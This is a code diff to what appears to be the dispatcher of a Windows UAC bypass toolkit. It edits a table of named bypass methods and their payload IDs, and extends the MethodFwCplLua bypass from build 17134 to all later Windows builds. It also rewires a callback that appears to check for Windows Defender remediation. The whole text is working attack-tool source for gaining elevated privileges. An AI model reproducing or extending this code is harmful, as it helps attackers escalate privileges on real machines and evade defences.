@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.90
 *
-*  DATE:        10 July 2018
+*  DATE:        01 Aug 2018
 *
 *  UAC bypass dispatch.
 *
@@ -68,7 +68,7 @@ UCM_API(MethodSPPLUAObject);
 ULONG CALLBACK IsMethodNeedRemediation(
     PVOID Parameter);
 
-UCM_EXTRA_CONTEXT g_ucmWDCallback = { IsMethodNeedRemediation, NULL };
+UCM_EXTRA_CONTEXT g_ucmWDCallback;
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -113,7 +113,7 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodFwCplLua, &g_ucmWDCallback, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodFwCplLua, &g_ucmWDCallback, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSluiHijack, &g_ucmWDCallback, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
@@ -121,6 +121,26 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCOMHandlers2, NULL, { 7600, MAXDWORD }, FUJINAMI_ID, FALSE, TRUE, TRUE },
     { MethodSPPLUAObject, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
+
+/*
+* SetupExtraContextCalbacks
+*
+* Purpose:
+*
+* Configure extra context callbacks.
+*
+*/
+VOID SetupExtraContextCalbacks(
+    VOID
+)
+{
+    g_ucmWDCallback.Parameter = (PVOID)g_ctx.IsWow64;
+    g_ucmWDCallback.Routine = IsMethodNeedRemediation;
+
+    //
+    // Reserved for future use.
+    //
+}
 
 /*
 * IsMethodNeedRemediation
@@ -265,6 +285,8 @@ BOOL MethodsManagerCall(
             return FALSE;
         }
     }
+
+    SetupExtraContextCalbacks();
 
     bResult = Entry->Routine(Method, Entry->ExtraContext, PayloadCode, PayloadSize);
 
@@ -938,7 +960,7 @@ UCM_API(MethodFwCplLua)
     if (g_ctx.dwBuildNumber >= 9600) {
         if (ExtraContext) {
             if (ExtraContext->Routine) {
-                if (ExtraContext->Routine((PVOID)g_ctx.IsWow64) != STATUS_NO_SECRETS)
+                if (ExtraContext->Routine(ExtraContext->Parameter) != STATUS_NO_SECRETS)
                     g_ctx.MethodExecuteType = ucmExTypeRemediationRequired;
             }
         }
@@ -993,14 +1015,13 @@ UCM_API(MethodSluiHijack)
     LPWSTR lpszPayload = NULL;
 
     UNREFERENCED_PARAMETER(Method);
-    UNREFERENCED_PARAMETER(ExtraContext);
     UNREFERENCED_PARAMETER(PayloadCode);
     UNREFERENCED_PARAMETER(PayloadSize);
 
     if (g_ctx.dwBuildNumber >= 9600) {
         if (ExtraContext) {
             if (ExtraContext->Routine) {
-                if (ExtraContext->Routine((PVOID)g_ctx.IsWow64) != STATUS_NO_SECRETS)
+                if (ExtraContext->Routine(ExtraContext->Parameter) != STATUS_NO_SECRETS)
                     g_ctx.MethodExecuteType = ucmExTypeRemediationRequired;
             }
         }
